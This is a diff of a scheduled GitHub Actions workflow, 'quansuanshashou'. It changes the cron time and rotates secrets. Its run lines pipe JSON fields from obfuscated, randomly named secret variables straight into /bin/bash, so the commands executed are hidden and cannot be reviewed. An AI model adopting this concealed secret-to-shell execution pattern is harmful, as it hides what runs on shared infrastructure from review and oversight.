@@ -3,7 +3,7 @@ name: quansuanshashou
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 3/6 * * *'
+    - cron: '45 4/6 * * *'
 
 jobs:
   build:
@@ -12,18 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: quansuanshashou
         env:
-          g917: ${{ secrets.g917 }}
+          qqq83159: ${{ secrets.qqq83159 }}
         run: |
-          echo $g917 | jq -r .q69452 | /bin/bash
-          echo $txdbt8 | jq -r .j7900 | /bin/bash
-          echo $va9 | jq -r .qbk2179 | /bin/bash
-          echo $mma2779 | jq -r .uwx120 | /bin/bash
-          echo $mpex1 | jq -r .xe1 | /bin/bash
-          echo $mvyf19 | jq -r .rud1 | /bin/bash
-          echo $tliki98510 | jq -r .trmzy24 | /bin/bash
-          echo $lov9598 | jq -r .fy2663 | /bin/bash
-          echo $q5734 | jq -r .w353 | /bin/bash
-          echo $vayxg124 | jq -r .fu0 | /bin/bash
-          echo $cmby5212 | jq -r .vz9 | /bin/bash
-          echo $zkhea14902 | jq -r .szca9395 | /bin/bash
+          echo $qqq83159 | jq -r .z75012 | /bin/bash
+          echo $c7 | jq -r .qbcb6960 | /bin/bash
+          echo $iulk816 | jq -r .wsjwd71422 | /bin/bash
+          echo $newfx0916 | jq -r .c1974 | /bin/bash
+          echo $jz661 | jq -r .f35992 | /bin/bash
+          echo $wltg4502 | jq -r .cqwu57 | /bin/bash
+          echo $lclzk7596 | jq -r .txfos8 | /bin/bash
+          echo $a47 | jq -r .eirs3972 | /bin/bash
+          echo $b740 | jq -r .agvgz9794 | /bin/bash
+          echo $v63 | jq -r .u769 | /bin/bash
+          echo $az959 | jq -r .yclv67 | /bin/bash
 
